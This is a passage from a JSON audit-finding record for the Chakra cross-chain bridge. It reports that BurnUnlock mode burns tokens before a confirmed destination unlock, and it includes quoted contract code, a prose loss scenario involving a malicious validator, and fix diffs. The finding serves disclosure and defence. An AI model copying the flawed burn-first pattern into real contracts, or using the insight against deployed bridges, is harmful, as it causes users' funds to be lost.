initially.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_lock(msg.sender, address(this), amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly minted on the destination chain. (_the Cairo code is equivalent to this_)\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_mint(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callaback on the source chain: Tokens are burned only after a successful callback. This is a security measure to ensure that user tokens are only burned when the user has received their tokens on the destination chain. If tokens were burned initially and then the call on the destination chain failed, **the user's tokens would effectively be lost on both chains**. More details on this will be provided later:\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389)\n\n```js\nif (status == CrossChainMsgStatus.Success) {\n  if (mode == SettlementMode.MintBurn) {\n    _erc20_burn(address(this), create_cross_txs[txid].amount);\n  }\n  create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n}\n```\n\n### `BurnUnlock` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are immediately burned on the source chain.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_burn(msg.sender, amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly unlocked\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_unlock(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callback on the source chain: No specific action for `BurnUnlock` mode in callback.\n\nTo summarize, the two distinct pattern for burning tokens is that: `MintBurn` follows a `lock (source) -> mint (dest) -> burn (callback)` and, `BurnUnlock` follows a `burn (source) -> unlock (dest)`.\n\nThe problem is that in the `BurnUnlock` mode, if the execution on the destination chain fails (for instance, due to insufficient validator signatures), the user's tokens are lost on both chains. This is because the tokens are burned on the source chain and remain locked on the destination chain, **preventing the user from reclaiming them at first try, and preventing the user from reclaiming them at a latter try because user already burned their equivalant tokens in the source chain**.\n\nNote that the problem doesn't exist in `MintBurn` mode (at least with this particular root cause) because we use the callback pattern. If the call to destination chain fails, the callback simply unlocks the tokens back on the source chain (which it doesn't do in the current implementation, but is a subject of a distinct report since it's a different root cause i.e, not implementing a callback pattern if bridging fails _vs_ not unlocking the tokens back in the callback pattern if bridging fails).\n\n## Proof of Concept\n\nHere's a scenario to illustrate:\n\n- Alice sends 1000 CHKR in `BurnUnlock` mode.\n- 1000 CHKR is burned on source chain. Let's assume Alice has 1000 CHKR locked on destination chain.\n- Sending tokens fails for some reasons, e.g, due to insufficient validator signatures. We can even consider an adversarial point of view where a malicious validator intentionally not signing a valid message hash to make it not reach required threshold and fail, with the malicious intent of causing loss of user tokens on both chains. An alternative scenario of failing is when Alice doesn't have enough tokens locked on destination chain (e.g, she sends 1000 CHKR tokens but she only has 800 CHKR tokens locked on destination chain).\n- Because sending tokens failed, Alice now have 0 CHKR on source chain and 1000 CHKR still locked on the destination chain.\n- Alice tries again to send 1000 CHKR in any mode. Because CHKR was initially burned in first try and is now 0, she doesn't have the equivalent CHKR to unlock it on the destination chain and is effectively lost forever on both chains.\n\n## Recommended Mitigation Steps\n\n- In my opinion, align the `BurnUnlock` mode with the `MintBurn` mode by implementing a lock-then-burn pattern:\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    // ...\n    if (mode == SettlementMode.BurnUnlock) {\n+       _erc20_lock(msg.sender, address(this), amount);\n-       _erc20_burn(msg.sender, address(this), amount);\n    }\n    // ...\n}\n```\n\n- Implement the callback part, and don't forget to unlock tokens back to the poor Alice on failure:\n\n```diff\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    // ...\n    if (status == CrossChainMsgStatus.Success) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_burn(address(this), create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    if (status == CrossChainMsgStatus.Failed) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_unlock(create_cross_txs[txid].from, create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n    // ...\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nToken-Transfer\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe `BurnUnlock` mode in the `ChakraSettlementHandler` contract has a critical flaw that causes token loss on both chains. This happens because tokens are burned on the source chain before ensuring a successful unlock on the destination chain. This high-risk vulnerability can lead to significant financial loss and damage trust in the cross-chain bridge system.\n\n_Note that the same issue persists in the Cairo code._\n", "recommendation_md": "## Recommended Mitigation Steps\n\n- In my opinion, align the `BurnUnlock` mode with the `MintBurn` mode by implementing a lock-then-burn pattern:\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    // ...\n    if (mode == SettlementMode.BurnUnlock) {\n+       _erc20_lock(msg.sender, address(this), amount);\n-       _erc20_burn(msg.sender, address(this), amount);\n    }\n    // ...\n}\n```\n\n- Implement the callback part, and don't forget to unlock tokens back to the poor Alice on failure:\n\n```diff\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    // ...\n    if (status == CrossChainMsgStatus.Success) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_burn(address(this), create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    if (status == CrossChainMsgStatus.Failed) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_unlock(create_cross_txs[txid].from, create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n    // ...\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nToken-Transfer\n", "poc_md": "## Proof of Concept\n\nHere's a scenario to illustrate:\n\n- Alice sends 1000 CHKR in `BurnUnlock` mode.\n- 1000 CHKR is burned on source chain. Let's assume Alice has 1000 CHKR locked on destination chain.\n- Sending tokens fails for some reasons, e.g, due to insufficient validator signatures. We can even consider an adversarial point of view where a malicious validator intentionally not signing a valid message hash to make it not reach required threshold and fail, with the malicious intent of causing loss of user tokens on both chains. An alternative scenario of failing is when Alice doesn't have enough tokens locked on destination chain (e.g, she sends 1000 CHKR tokens but she only has 800 CHKR tokens locked on destination chain).\n- Because sending tokens failed, Alice now have 0 CHKR on source chain and 1000 CHKR still locked on the destination chain.\n- Alice tries again to send 1000 CHKR in any mode. Because CHKR was initially burned in first try and is now 0, she doesn't have the equivalent CHKR to unlock it on the destination chain and is effectively lost forever on both chains.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348\n\n**container:**\n# Vulnerability details\n## Vulnerability Details\n\nIn the `ChakraSettlementHandler` contract, we got two modes that burns tokens in the bridging process:\n\n- `MintBurn`: Tokens are burned on the source chain and minted on the destination chain. This mode is used when you want to permenantly move tokens from one chain to another.\n\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the destination chain. This mode is used when you want to move tokens from one chain to another and decrease the supply on the source chain.\n\nWe observe two distinct pattern of burning tokens in `MintBurn` vs `BurnUnlock` modes:\n\n### `MintBurn` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are locked instead of burned initially.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_lock(msg.sender, address(this), amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly minted on the destination chain. (_the Cairo code is equivalent to this_)\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_mint(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callaback on the source chain: Tokens are burned only after a successful callback. This is a security measure to ensure that user tokens are only burned when the user has received their tokens on the destination chain. If tokens were burned initially and then the call on the destination chain failed, **the user's tokens would effectively be lost on both chains**. More details on this will be provided later:\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389)\n\n```js\nif (status == CrossChainMsgStatus.Success) {\n  if (mode == SettlementMode.MintBurn) {\n    _erc20_burn(address(this), create_cross_txs[txid].amount);\n  }\n  create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n}\n```\n\n### `BurnUnlock` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are immediately burned on the source chain.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_burn(msg.sender, amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly unlocked\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_unlock(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callback on the source chain: No specific action for `BurnUnlock` mode in callback.\n\nTo summarize, the two distinct pattern for burning tokens is that: `MintBurn` follows a `lock (source) -> mint (dest) -> burn (callback)` and, `BurnUnlock` follows a `burn (source) -> unlock (dest)`.\n\nThe problem is that in the `BurnUnlock` mode, if the execution on the destination chain fails (for instance, due to insufficient validator signatures), the user's tokens are lost on both chains. This is because the tokens are burned on the source chain and remain locked on the destination chain, **preventing the user from reclaiming them at first try, and preventing the user from reclaiming them at a latter try because user already burned their equivalant tokens in the source chain**.\n\nNote that the problem doesn't exist in `MintBurn` mode (at least with this particular root cause) because we use the callback pattern. If the call to destination chain fails, the callback simply unlocks the tokens back on the source chain (which it doesn't do in the current implementation, but is a subject of a distinct report since it's a different root cause i.e, not implementing a callback pattern if bridging fails _vs_ not unlocking the tokens back in the callback pattern if bridging fails).\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348\n\n\n# Vulnerability details\n\n## Impact\n\nThe `BurnUnlock` mode in the `ChakraSettlementHandler` contract has a critical flaw that causes token loss on both chains. This happens because tokens are burned on the source chain before ensuring a successful unlock on the destination chain. This high-risk vulnerability can lead to significant financial loss and damage trust in the cross-chain bridge system.\n\n_Note that the same issue persists in the Cairo code._\n\n## Vulnerability Details\n\nIn the `ChakraSettlementHandler` contract, we got two modes that burns tokens in the bridging process:\n\n- `MintBurn`: Tokens are burned on the source chain and minted on the destination chain. This mode is used when you want to permenantly move tokens from one chain to another.\n\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the destination chain. This mode is used when you want to move tokens from one chain to another and decrease the supply on the source chain.\n\nWe observe two distinct pattern of burning tokens in `MintBurn` vs `BurnUnlock` modes:\n\n### `MintBurn` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are locked instead of burned initially.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_lock(msg.sender, address(this), amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly minted on the destination chain. (_the Cairo code is equivalent to this_)\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_mint(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callaback on the source chain: Tokens are burned only after a successful callback. This is a security measure to ensure that user tokens are only burned when the user has received their tokens on the destination chain. If tokens were burned initially and then the call on the destination chain failed, **the user's tokens would effectively be lost on both chains**. More details on this will be provided later:\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389)\n\n```js\nif (status == CrossChainMsgStatus.Success) {\n  if (mode == SettlementMode.MintBurn) {\n    _erc20_burn(address(this), create_cross_txs[txid].amount);\n  }\n  create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n}\n```\n\n### `BurnUnlock` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are immediately burned on the source chain.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_burn(msg.sender, amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly unlocked\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_unlock(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callback on the source chain: No specific action for `BurnUnlock` mode in callback.\n\nTo summarize, the two distinct pattern for burning tokens is that: `MintBurn` follows a `lock (source) -> mint (dest) -> burn (callback)` and, `BurnUnlock` follows a `burn (source) -> unlock (dest)`.\n\nThe problem is that in the `BurnUnlock` mode, if the execution on the destination chain fails (for instance, due to insufficient validator signatures), the user's tokens are lost on both chains. This is because the tokens are burned on the source chain and remain locked on the destination chain, **preventing the user from reclaiming them at first try, and preventing the user from reclaiming them at a latter try because user already burned their equivalant tokens in the source chain**.\n\nNote that the problem doesn't exist in `MintBurn` mode (at least with this particular root cause) because we use the callback pattern. If the call to destination chain fails, the callback simply unlocks the tokens back on the source chain (which it doesn't do in the current implementation, but is a subject of a distinct report since it's a different root cause i.e, not implementing a callback pattern if bridging fails _vs_ not unlocking the tokens back in the callback pattern if bridging fails).\n\n## Proof of Concept\n\nHere's a scenario to illustrate:\n\n- Alice sends 1000 CHKR in `BurnUnlock` mode.\n- 1000 CHKR is burned on source chain. Let's assume Alice has 1000 CHKR locked on destination chain.\n- Sending tokens fails for some reasons, e.g, due to insufficient validator signatures. We can even consider an adversarial point of view where a malicious validator intentionally not signing a valid message hash to make it not reach required threshold and fail, with the malicious intent of causing loss of user tokens on both chains. An alternative scenario of failing is when Alice doesn't have enough tokens locked on destination chain (e.g, she sends 1000 CHKR tokens but she only has 800 CHKR tokens locked on destination chain).\n- Because sending tokens failed, Alice now have 0 CHKR on source chain and 1000 CHKR still locked on the destination chain.\n- Alice tries again to send 1000 CHKR in any mode. Because CHKR was initially burned in first try and is now 0, she doesn't have the equivalent CHKR to unlock it on the destination chain and is effectively lost forever on both chains.\n\n## Recommended Mitigation Steps\n\n- In my opinion, align the `BurnUnlock` mode with the `MintBurn` mode by implementing a lock-then-burn pattern:\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    // ...\n    if (mode == SettlementMode.BurnUnlock) {\n+       _erc20_lock(msg.sender, address(this), amount);\n-       _erc20_burn(msg.sender, address(this), amount);\n    }\n    // ...\n}\n```\n\n- Implement the callback part, and don't forget to unlock tokens back to the poor Alice on failure:\n\n```diff\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    // ...\n    if (status == CrossChainMsgStatus.Success) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_burn(address(this), create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    if (status == CrossChainMsgStatus.Failed) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_unlock(create_cross_txs[txid].from, create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n    // ...\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nToken-Transfer\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348\n\n\n# Vulnerability details\n\n## Impact\n\nThe `BurnUnlock` mode in the `ChakraSettlementHandler` contract has a critical flaw that causes token loss on both chains. This happens because tokens are burned on the source chain before ensuring a successful unlock on the destination chain. This high-risk vulnerability can lead to significant financial loss and damage trust in the cross-chain bridge system.\n\n_Note that the same issue persists in the Cairo code._\n\n## Vulnerability Details\n\nIn the `ChakraSettlementHandler` contract, we got two modes that burns tokens in the bridging process:\n\n- `MintBurn`: Tokens are burned on the source chain and minted on the destination chain. This mode is used when you want to permenantly move tokens from one chain to another.\n\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the destination chain. This mode is used when you want to move tokens from one chain to another and decrease the supply on the source chain.\n\nWe observe two distinct pattern of burning tokens in `MintBurn` vs `BurnUnlock` modes:\n\n### `MintBurn` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are locked instead of burned initially.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L123-L124)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_lock(msg.sender, address(this), amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly minted on the destination chain. (_the Cairo code is equivalent to this_)\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L325-L329)\n\n```js\nif (mode == SettlementMode.MintBurn) {\n  _erc20_mint(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callaback on the source chain: Tokens are burned only after a successful callback. This is a security measure to ensure that user tokens are only burned when the user has received their tokens on the destination chain. If tokens were burned initially and then the call on the destination chain failed, **the user's tokens would effectively be lost on both chains**. More details on this will be provided later:\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L383-L389)\n\n```js\nif (status == CrossChainMsgStatus.Success) {\n  if (mode == SettlementMode.MintBurn) {\n    _erc20_burn(address(this), create_cross_txs[txid].amount);\n  }\n  create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n}\n```\n\n### `BurnUnlock` mode:\n\n- Source chain (`cross_chain_erc20_settlement`): Tokens are immediately burned on the source chain.\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L129-L130)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_burn(msg.sender, amount);\n}\n```\n\n- Destination chain (`receive_cross_chain_msg`): Tokens are correctly unlocked\n\n[solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L344-L348)\n\n```js\nif (mode == SettlementMode.BurnUnlock) {\n  _erc20_unlock(\n    AddressCast.to_address(transfer_payload.to),\n    transfer_payload.amount\n  );\n  return true;\n}\n```\n\n- Callback on the source chain: No specific action for `BurnUnlock` mode in callback.\n\nTo summarize, the two distinct pattern for burning tokens is that: `MintBurn` follows a `lock (source) -> mint (dest) -> burn (callback)` and, `BurnUnlock` follows a `burn (source) -> unlock (dest)`.\n\nThe problem is that in the `BurnUnlock` mode, if the execution on the destination chain fails (for instance, due to insufficient validator signatures), the user's tokens are lost on both chains. This is because the tokens are burned on the source chain and remain locked on the destination chain, **preventing the user from reclaiming them at first try, and preventing the user from reclaiming them at a latter try because user already burned their equivalant tokens in the source chain**.\n\nNote that the problem doesn't exist in `MintBurn` mode (at least with this particular root cause) because we use the callback pattern. If the call to destination chain fails, the callback simply unlocks the tokens back on the source chain (which it doesn't do in the current implementation, but is a subject of a distinct report since it's a different root cause i.e, not implementing a callback pattern if bridging fails _vs_ not unlocking the tokens back in the callback pattern if bridging fails).\n\n## Proof of Concept\n\nHere's a scenario to illustrate:\n\n- Alice sends 1000 CHKR in `BurnUnlock` mode.\n- 1000 CHKR is burned on source chain. Let's assume Alice has 1000 CHKR locked on destination chain.\n- Sending tokens fails for some reasons, e.g, due to insufficient validator signatures. We can even consider an adversarial point of view where a malicious validator intentionally not signing a valid message hash to make it not reach required threshold and fail, with the malicious intent of causing loss of user tokens on both chains. An alternative scenario of failing is when Alice doesn't have enough tokens locked on destination chain (e.g, she sends 1000 CHKR tokens but she only has 800 CHKR tokens locked on destination chain).\n- Because sending tokens failed, Alice now have 0 CHKR on source chain and 1000 CHKR still locked on the destination chain.\n- Alice tries again to send 1000 CHKR in any mode. Because CHKR was initially burned in first try and is now 0, she doesn't have the equivalent CHKR to unlock it on the destination chain and is effectively lost forever on both chains.\n\n## Recommended Mitigation Steps\n\n- In my opinion, align the `BurnUnlock` mode with the `MintBurn` mode by implementing a lock-then-burn pattern:\n\n```diff\nfunction cross_chain_erc20_settlement(\n    string memory to_chain,\n    uint256 to_handler,\n    uint256 to_token,\n    uint256 to,\n    uint256 amount\n) external {\n    // ...\n    if (mode == SettlementMode.BurnUnlock) {\n+       _erc20_lock(msg.sender, address(this), amount);\n-       _erc20_burn(msg.sender, address(this), amount);\n    }\n    // ...\n}\n```\n\n- Implement the callback part, and don't forget to unlock tokens back to the poor Alice on failure:\n\n```diff\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    // ...\n    if (status == CrossChainMsgStatus.Success) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_burn(address(this), create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n    if (status == CrossChainMsgStatus.Failed) {\n+       if (mode == SettlementMode.BurnUnlock) {\n+           _erc20_unlock(create_cross_txs[txid].from, create_cross_txs[txid].amount);\n+       }\n        create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n    }\n    // ...\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nToken-Transfer"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
